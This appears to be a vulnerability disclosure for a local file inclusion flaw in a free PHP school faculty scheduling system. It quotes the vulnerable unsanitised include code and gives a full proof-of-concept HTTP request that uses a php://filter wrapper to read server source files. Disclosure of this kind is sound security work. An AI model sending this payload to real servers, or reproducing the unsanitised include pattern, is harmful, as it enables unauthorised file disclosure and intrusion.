# Local File Inclusion in School Faculty Scheduling System

## Vendor Homepage:
> https://www.campcodes.com/projects/php/school-faculty-scheduling-system-using-php-mysql-free-download/

## Affected Component
> /admin/index.php

## Code
```php
  <main id="view-panel" >
<?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
<?php include $page.'.php' ?>
  </main>
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /scheduling/admin/index.php?page=php://filter/convert.base64-encode/resource=index HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://localhost/scheduling/admin/login.php
Cookie: csrftoken=hn6Cf393SZVS43NE14nv2rYENzlA2dLXNthZqmVXNw6j1t0dOvrk3n8kgQeKAnBn; PHPSESSID=d3aau3jei5d0ketkecnsk6mivf
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

## Screenshot
![image](https://github.com/user-attachments/assets/d0b85e40-79b4-405a-b916-750793c57b50)
![image](https://github.com/user-attachments/assets/77b48757-0296-4044-9766-f42a1c2ae6c6)



## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
